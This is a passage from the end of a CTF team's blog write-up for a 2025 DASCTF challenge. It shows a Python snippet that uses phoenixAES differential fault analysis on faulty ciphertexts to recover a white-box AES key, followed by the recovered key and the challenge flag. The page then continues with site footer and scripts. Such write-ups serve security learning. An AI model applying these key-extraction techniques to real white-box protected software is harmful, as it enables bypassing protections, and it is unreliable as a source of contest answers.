class="keyword">as</span> t:</span><br><span class="line">    t.write(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">db997e69af7daf43bfadaa94bc68bbef</span></span><br><span class="line"><span class="string">9b997e69af7daf52bfad4494bc64bbef</span></span><br><span class="line"><span class="string">db997e93af7d2043bf20aa94a968bbef</span></span><br><span class="line"><span class="string">db99de69af8aaf43bbadaa94bc68bbfc</span></span><br><span class="line"><span class="string">db237e69417daf43bfadaa8cbc68c7ef</span></span><br><span class="line"><span class="string">dbef7e69ef7daf43bfadaac5bc6822ef</span></span><br><span class="line"><span class="string">b8997e69af7dafd3bfadbc94bc56bbef</span></span><br><span class="line"><span class="string">db997e69af7daf43bfadaa94bc68bbef</span></span><br><span class="line"><span class="string">db99f569af4aaf43deadaa94bc68bbf4</span></span><br><span class="line"><span class="string">db99d669afcaaf43ebadaa94bc68bb00</span></span><br><span class="line"><span class="string">db4b7e69c07daf43bfadaa86bc68bdef</span></span><br><span class="line"><span class="string">c0997e69af7dafdcbfad5a94bc03bbef</span></span><br><span class="line"><span class="string">db997e5baf7d5a43bf22aa943b68bbef</span></span><br><span class="line"><span class="string">db997ed4af7da743bfc3aa941068bbef</span></span><br><span class="line"><span class="string">db995969af5aaf437aadaa94bc68bb5f</span></span><br><span class="line"><span class="string">db057e697a7daf43bfadaa6cbc684cef</span></span><br><span class="line"><span class="string">a2997e69af7dafd8bfad6694bc18bbef</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.encode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(phoenixAES.crack_file(<span class="string">&#x27;tracefile&#x27;</span>))</span><br><span class="line"><span class="comment"># Last round key #N found:</span></span><br><span class="line"><span class="comment"># 040D08DA68001026F3DC0D68897148B4</span></span><br></pre></td></tr></table></figure>

<p>sus求解第一轮密钥：</p>
<p><img src="./3b0f6c59-984f-48fa-9cb7-f8d25f7482c1.png" alt="img"></p>
<p>44306E5175317830746535616E636830——D0nQu1x0te5anch0</p>
<p><img src="./9612a3b1-cd10-43a3-a19c-77e48c3c8c5e.png" alt="img"></p>
<p>得到flag为DASCTF{FALLEN_FLOWERS_FADE_NONE_CARES}</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>2025 DASCTF上半年赛 SU WriteUp</p><p><a href="https://team-su.github.io/2025/06/21/2025-DASCTF上半年/">https://team-su.github.io/2025/06/21/2025-DASCTF上半年/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2025-06-21</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-06-22</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/DASCTF/">DASCTF</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2025/06/09/2025-0penHarmonyCTF/"><span class="level-item">2025 0penHarmonyCTF SU WriteUp</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right  order-3 is-sticky"><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/javascript" id="MathJax-script" async>MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
        fontCache: 'global'
      },
      chtml: {
        matchFontHeight: false
      }
    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>